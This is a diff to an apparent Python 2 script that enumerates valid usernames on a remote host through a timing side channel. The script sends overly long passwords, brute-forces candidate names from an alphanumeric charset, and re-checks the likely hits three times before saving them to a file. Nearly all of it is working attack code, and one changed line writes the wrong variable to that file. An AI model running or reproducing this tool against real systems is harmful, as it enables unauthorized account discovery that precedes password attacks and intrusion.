@@ -113,7 +113,7 @@ def display(existing):
 			print name
 		print "It is possible some of these are false positives if jitter or variance in cpu load occured during tests."
 	else:
-		print "No users were found"
+		print "No users were found from the common username list."
 
 #This function returns true if this is a LAN address
 def is_private(ip):
@@ -135,7 +135,7 @@ def is_ipv4(ip):
 #This is function to estimate the time to completion for bruteoforcing
 def etc(avg_rtt, min_len, max_len):
 	etc = 0
-	for i in range(min_len-1,max_len):
+	for i in range(min_len,max_len+1):
 		etc += avg_rtt*(36**i)
 	return etc
 
@@ -145,7 +145,7 @@ if is_ipv4(machine):
 	if is_private(machine):
 		pass_len = 3000
 	else:
-		pass_len = 25000
+		pass_len = 30000
 else:
 	print "Please go read RFC 791 and then use a legitimate IPv4 address."
 	sys.exit()
@@ -203,6 +203,7 @@ if ans == "y":
 		print "This will take approximately %d months." % time_estimate
 	print "However, you will be informed as soon as a user is found."
 	tested = 0
+	probable = []
 	for i in range(int(min_len), int(max_len)+1, 1):
 		x = itertools.product('etaoinshrdlcumwfgypbvkjxqz1234567890', repeat=i)
 		for tup in x:
@@ -214,8 +215,20 @@ if ans == "y":
 			else:
 				dur = sidechan(name,machine,pass_len)
 				if dur > 3*avg_rtt:
-					print name+' probably exists.'
-					f = open('Ranked-Users.txt', 'a');
-					f.write(name+'\n');
-					f.close();
-	sys.stdout.write('\n')
+					print name+' probably exists; test it by hand to see RTT.'
+					probable.append(name)
+if probable == []:
+	print "No users were found during the brute-force enumeration."
+else:
+	for potential_user in probable:
+		x = sidechan(potential_user,machine,pass_len)
+		y = sidechan(potential_user,machine,pass_len)
+		z = sidechan(potential_user,machine,pass_len)
+		if x > 3*avg_rtt and y > 3*avg_rtt and z > 3*avg_rtt:
+			f = open('Ranked-Users.txt', 'a');
+			f.write(name+'\n');
+			f.close();
+			print potential_user+' exists and has been added to the saved user list.'
+		else:
+			print potential_user+' was probably a false positive.'
+sys.stdout.write('\n')
